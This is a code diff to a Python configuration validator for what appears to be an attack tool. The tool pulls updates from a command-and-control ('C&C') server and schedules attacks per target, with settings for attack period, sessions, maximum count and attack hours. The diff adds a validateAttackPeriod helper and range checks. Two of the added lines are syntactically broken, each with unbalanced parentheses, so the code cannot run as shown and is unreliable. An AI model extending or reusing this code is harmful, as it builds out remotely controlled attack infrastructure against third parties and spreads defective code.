@@ -71,7 +71,7 @@ def validateConfigFile(config_file, override):
 
     # 1. check for updates connecting to C&C (if not override option is enabled)
     if (not override) and (len(configuration['cc_server']) != 0):
-         cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, configuration['last_modified'])
+         cc_config, updated = validateCCUpdate(configuration['cc_server'], rootSchema, int(configuration['last_modified'])
          # check for remote connection success and update local configuration
          if updated:
              configuration = cc_config
@@ -89,9 +89,11 @@ def validateConfigFile(config_file, override):
             if not set(target.keys()).issubset(set(targetSchema.keys())):
                 return None
             # check for custom values to be polished or set to default
-            for setting in ['period', 'max_count', 'sessions']:
-                if (target[setting] <= 0) or (setting not in target):
+            for setting in ['max_count', 'sessions']:
+                if (int(target[setting]) <= 0) or (setting not in target):
                     target[setting] = targetSchema[setting]
+            # check for attack period
+            target['period'] = validateAttackPeriod(target['period'], default=1)
             # check for action conditions
             ac = 'action_conditions'
             if ac not in target:
@@ -111,6 +113,32 @@ def validateConfigFile(config_file, override):
 
     return configuration
 
+
+
+def validateAttackPeriod(period, default=1):
+    """
+    This utility is designed to set period according user scenario or providing a default.
+    (period is expressed in seconds)
+
+    @param period, string - attack period config. definition
+    @param default, integer - optional default value to assign to period 
+    @return period 
+    """
+    # check if period is a single integer 
+    try:
+        period = int(period)
+        if period <= 0:
+            period = default
+        return [period]
+    # in this case we have a range 
+    except ValueError:
+        periodRange = map((lambda t: int(t), period.split("-"))
+        periodRange = list(periodRange)
+        if len(periodRange) == 1:
+            raise Exception("Wrong format for period!")
+        return periodRange
+
+    
 
 
 def validateCCUpdate(server, schema, last_modified):
@@ -186,6 +214,8 @@ def validateActionConditions(action, schema):
     if at in action:
         attackTime = map((lambda t: int(t) % (24 + 1)), action[at].split("-"))
         attackTime = list(attackTime)
+        if len(attackTime) == 1:
+            raise Exception("Wrong format for attack_time!")
         action[at] = str(min(attackTime)) + "-" + str(max(attackTime))
     
     # check for avoid week
